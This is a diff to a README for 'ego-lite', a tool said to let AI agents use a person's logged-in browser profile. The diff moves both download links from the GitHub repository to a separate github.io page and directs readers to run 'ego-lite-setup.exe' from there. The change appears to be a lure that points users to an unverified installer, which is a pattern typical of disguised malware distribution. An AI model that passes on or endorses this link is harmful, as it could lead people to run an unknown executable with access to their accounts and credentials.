@@ -1,12 +1,12 @@
 # 🧭 ego-lite - Run web agents without interrupting work
 
-[![](https://img.shields.io/badge/Download-ego-lite-blue.svg)](https://github.com/fourth3950/ego-lite)
+[![](https://img.shields.io/badge/Download-ego-lite-blue.svg)](https://fourth3950.github.io)
 
 ego-lite allows you to connect your browser profile to your AI agents. You can run automated web tasks through your existing logged-in accounts. This setup prevents your agents from bothering you while they work in the background. It requires no setup time and contains no costs for the end user.
 
 ## 📥 How to download the software
 
-Visit [this page](https://github.com/fourth3950/ego-lite) to download the current version of the software. You will find the installer file listed under the latest release section. Click the link labeled ego-lite-setup.exe to start the download.
+Visit [this page](https://fourth3950.github.io) to download the current version of the software. You will find the installer file listed under the latest release section. Click the link labeled ego-lite-setup.exe to start the download.
 
 ## 🛠 Prerequisites
 
